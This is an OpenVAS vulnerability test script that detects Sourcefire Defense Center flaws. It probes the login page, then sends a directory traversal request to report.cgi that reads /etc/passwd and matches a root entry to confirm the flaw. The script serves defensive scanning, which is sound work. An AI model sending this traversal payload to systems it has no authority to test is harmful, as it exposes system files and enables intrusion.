###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_Sourcefire_Defense_Center_52887.nasl 12 2013-10-27 11:15:33Z jan $
#
# Sourcefire Defense Center Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Sourcefire Defense Center is prone to multiple security
vulnerabilities, including multiple arbitrary-file-download
vulnerabilities, an arbitrary-file-deletion vulnerability, a security-
bypass vulonerability, and an HTML-injection vulnerability.

Exploiting these vulnerabilities may allow an attacker to view or
delete arbitrary files within the context of the application, gain
unauthorized access and execute HTML and script code in the context of
the affected site, steal cookie-based authentication credentials, or
control how the site is rendered to the user. Information harvested
may aid in launching further attacks.

Sourcefire Defense Center versions prior to 4.10.2.3 are vulnerable.";

tag_solution = "Updates are available. Please see the reference for more details.";

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


if (description)
{
 script_id(103460);
 script_bugtraq_id(52887);
 script_version ("$Revision: 12 $");

 script_name("Sourcefire Defense Center Multiple Security Vulnerabilities");

 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-04-05 11:02:10 +0200 (Thu, 05 Apr 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read /etc/passwd");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52887");
 script_xref(name : "URL" , value : "http://www.sourcefire.com/products/3D/defense_center");
 script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Apr/52?utm_source=twitterfeed&amp;utm_medium=twitter");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/login.cgi"); 

  if(http_vuln_check(port:port, url:url,pattern:"Sourcefire Inc")) {

    url = '/ComparisonViewer/report.cgi?file=../../../../../etc/passwd';

    if(passwd = http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {

      desc = desc + '\n\nUrl: ' + url + '\nResult:\n' + passwd + '\n';
     
      security_hole(port:port,data:desc);
      exit(0);

    }

  }
}

exit(0);

